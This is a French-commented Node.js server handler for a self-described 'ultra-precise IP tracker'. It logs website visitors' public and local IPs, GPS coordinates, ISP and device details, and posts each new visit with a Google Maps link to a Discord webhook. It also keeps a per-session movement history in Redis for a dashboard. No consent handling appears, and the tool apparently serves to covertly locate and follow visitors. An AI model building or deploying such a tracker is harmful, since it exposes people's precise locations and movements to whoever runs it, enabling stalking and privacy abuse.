import { createClient } from 'redis';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Méthode non autorisée' });
  }

  // Connexion Redis/KV
  const redisUrl = process.env.REDIS_URL || process.env.KV_URL;
  let client = null;

  if (redisUrl) {
    client = createClient({ 
      url: redisUrl,
      socket: {
        connectTimeout: 5000,
        reconnectStrategy: false
      }
    });
    client.on('error', (err) => console.error('Redis Client Error', err));
    try {
      await client.connect();

      // Vérifier si la session a été supprimée manuellement par l'admin
      if (req.body.sessionId) {
        const isDeleted = await client.get(`deleted_session:${req.body.sessionId}`);
        if (isDeleted) {
          console.log(`SESSION IGNORÉE (Supprimée): ${req.body.sessionId}`);
          await client.quit();
          return res.status(200).json({ success: true, message: "Session ignorée" });
        }
      }
    } catch (e) {
      console.error("Échec connexion Redis dans log.js:", e);
      client = null; // On continue sans Redis pour Discord
    }
  }

  const forwarded = req.headers['x-forwarded-for'];
  const publicIp = forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress;
  
  let geo = {};
  try {
    // Utilisation d'un service plus précis avec plus de détails
    const geoRes = await fetch(`http://ip-api.com/json/${publicIp}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query`);
    geo = await geoRes.json();
  } catch (e) {
    console.error("Erreur géo:", e);
  }

  const { sessionId, isUpdate, forceDiscord, localIp, preciseLocation, deviceStats, userAgent, language, screenResolution, referrer, page } = req.body;

  let displayLocation = `${geo.city || 'Inconnue'} (${geo.regionName || ''}), ${geo.country || 'Inconnu'} [ZIP: ${geo.zip || '?'}]`;
  
  // Si on a le GPS, on essaie de trouver le nom de la ville réelle (Reverse Geocoding)
  if (preciseLocation) {
    try {
      const revRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${preciseLocation.lat}&lon=${preciseLocation.lon}`, {
        headers: { 'User-Agent': 'SaadaaTracker/1.0' }
      });
      const revData = await revRes.json();
      if (revData && revData.address) {
        const city = revData.address.city || revData.address.town || revData.address.village || revData.address.municipality;
        const county = revData.address.county || revData.address.state;
        displayLocation = `📍 ${city || 'Ville inconnue'} (${county || ''}), ${revData.address.country}`;
      }
    } catch (e) {
      console.error("Erreur reverse géo:", e);
      displayLocation = `✅ GPS PRÉCIS (Coordonnées OK)`;
    }
  }

  const logEntry = {
    sessionId: sessionId || 'unknown',
    isUpdate: !!isUpdate,
    forceDiscord: !!forceDiscord,
    timestamp: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }),
    publicIp,
    localIp,
    location: displayLocation,
    isp: geo.isp || 'ISP inconnu',
    coords: preciseLocation ? `${preciseLocation.lat}, ${preciseLocation.lon}` : `${geo.lat || '?'}, ${geo.lon || '?'}`,
    accuracy: preciseLocation ? preciseLocation.accuracy : null,
    deviceStats: deviceStats || {},
    isPrecise: !!preciseLocation,
    userAgent,
    language,
    screenResolution,
    referrer,
    page: page || 'Inconnue'
  };

  console.log('NOUVELLE VISITE CAPTURÉE:', JSON.stringify(logEntry, null, 2));

  // Envoi vers Discord (Si première visite OU si forcé par l'admin)
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
  
  const shouldSendToDiscord = webhookUrl && (
    logEntry.forceDiscord === true || 
    isUpdate === false || 
    isUpdate === undefined || 
    isUpdate === "false"
  );

  if (shouldSendToDiscord) {
    const cleanCoords = logEntry.coords.replace(/\s/g, '');
    const mapsLink = `https://www.google.com/maps?q=${cleanCoords}`;
    
    const locValue = logEntry.isPrecise 
      ? `✅ **LOCALISATION RÉELLE (GPS)**\n**${logEntry.location}**\n\n📍 [Ouvrir dans Google Maps](${mapsLink})\nCoords: \`${logEntry.coords}\`` 
      : `❌ IP Uniquement (Approximatif)\n**${logEntry.location}**\nCoords: \`${logEntry.coords}\``;

    const fields = [
      { name: "🕒 Date (Paris)", value: logEntry.timestamp, inline: true },
      { name: "🌐 IP Publique (WiFi)", value: `\`${publicIp}\``, inline: true },
      { name: "🏠 IP Locale (Appareil)", value: `\`${localIp}\``, inline: true },
      { name: "📍 Localisation Précise", value: locValue }
    ];

    if (!logEntry.isPrecise) {
      fields.push({ name: "📡 Fournisseur (ISP)", value: logEntry.isp });
    }

    fields.push(
      { name: "📄 Page", value: logEntry.page },
      { name: "🆔 Session", value: `\`${logEntry.sessionId}\``, inline: true }
    );

    try {
      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: "🚀 Nouvelle Visite sur le Site !",
            color: logEntry.isPrecise ? 0x00FF00 : 0xFFA500,
            fields: fields,
            footer: { text: "Tracker IP Ultra-Précis - Saadaa le Goat" }
          }]
        })
      });
    } catch (e) {
      console.error("Erreur Webhook Discord:", e);
    }
  }

  // Stockage pour le dashboard (Redis Cloud)
  if (client) {
    try {
      // 1. Log général
      const logLine = `[${logEntry.timestamp}] IP:${publicIp} | Local:${localIp} | Loc:${logEntry.location} | Session:${logEntry.sessionId}\n`;
      await client.lPush('visitor_logs', logLine);

      // 2. Historique de mouvement pour cette session
      const movementData = JSON.stringify({
        lat: preciseLocation ? preciseLocation.lat : geo.lat,
        lon: preciseLocation ? preciseLocation.lon : geo.lon,
        accuracy: logEntry.accuracy,
        deviceStats: logEntry.deviceStats,
        time: logEntry.timestamp,
        isPrecise: logEntry.isPrecise,
        localIp: localIp,
        page: logEntry.page
      });
      await client.rPush(`session_movement:${logEntry.sessionId}`, movementData);
      
      // 3. Liste des sessions actives
      await client.sAdd('active_sessions', logEntry.sessionId);

    } catch (e) {
      console.error("Erreur Stockage Redis:", e);
    } finally {
      await client.quit();
    }
  }

  return res.status(200).json({ success: true, ip: publicIp });
}
